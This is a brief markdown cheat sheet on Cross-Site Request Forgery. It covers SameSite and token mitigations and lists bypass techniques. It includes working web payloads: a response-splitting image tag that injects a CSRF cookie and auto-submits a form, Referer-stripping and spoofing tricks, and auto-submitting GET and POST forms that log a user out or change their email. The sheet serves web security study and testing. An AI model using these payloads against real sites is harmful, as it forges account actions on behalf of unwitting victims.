---
title: CSRF - Cross Site Request Forgery
description: Introduction Cross Site Request Forgery
---

# CSRF Attack

## Definition

Cross-Site Request Forgery (CSRF) is a type of web security vulnerability that allows an attacker to send malicious requests from a victim's browser to a target website. These attacks are designed to trick the victim's browser into believing that the request is legitimate, and to carry out an action on the target website on behalf of the victim.

## Mitigations

1. Use the `SameSite` cookie attribute to :
    - `Strict` : the browser will **not** include the cookie in any requests that originate from another site.
    - `Lax` :  the browser will include the cookie in requests that originate from another site but only if **two conditions** are met : GET method and the request resulted from a top-level navigation by the user, such as clicking a link (not requests by JS).
2. Use random CSRF Token.

## Attacks

Attacks are often based on two things :

1. Cookie-based session handling.
2. No unpredictable request parameters.

Examples :

- Change request method
- Remove CSRF attribute
- Cookie CSRF is the same as the CSRF param.
    - Use a HTTP response splitting to set the cookie of a specific value
    - Perform CSRF
    - `<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
- CSRF check based on Referer header
    - Bypass by disabling Referer header `<meta name="referrer" content="never">`
    - Bypass it by including the correct Referer `evil.com?good.com`
        - Use header [Referrer-Policy: unsafe-url](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy#directives) and `history.pushState("", "", "/?evil.com")`

## Payloads

### GET

```html
<img src="https://example.com/logout">
```

### POST

```html
<form method="POST" action="https://example.com/email">
    <input type="hidden" name="email" value="hello@hello.com">
    <input type="hidden" name="csrf" value="0KL98nyeTFWocYvP8q9RHGrIt9IYn1Q7">
</form>
<script>
        document.forms[0].submit();
</script>
```

## References

- https://portswigger.net/web-security/csrf
- https://portswigger.net/web-security/csrf/samesite-cookies
